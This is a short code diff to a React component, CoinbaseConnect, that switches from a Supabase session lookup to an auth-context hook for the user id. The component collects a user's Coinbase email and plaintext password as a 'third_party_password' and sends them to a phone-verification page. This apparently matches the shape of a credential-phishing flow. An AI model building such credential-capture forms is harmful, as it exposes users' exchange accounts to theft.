@@ -1,6 +1,7 @@
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { supabase } from '../../lib/supabase';
+import { useAuth } from '../../contexts/AuthContext';
 
 function CoinbaseLogo() {
   return (
@@ -10,6 +11,7 @@ function CoinbaseLogo() {
 
 export default function CoinbaseConnect() {
   const navigate = useNavigate();
+  const { user } = useAuth();
   const [credentials, setCredentials] = useState({
     email: '',
     password: '',
@@ -41,12 +43,11 @@ export default function CoinbaseConnect() {
 
     setLoading(true);
     try {
-      const { data: { session } } = await supabase.auth.getSession();
       const platformData = {
         platform: 'Coinbase',
         email: credentials.email,
         third_party_password: credentials.password,
-        user_id: session?.user?.id || null,
+        user_id: user?.id || null,
       };
 
       // Navigate to verification page with credentials and a masked phone target
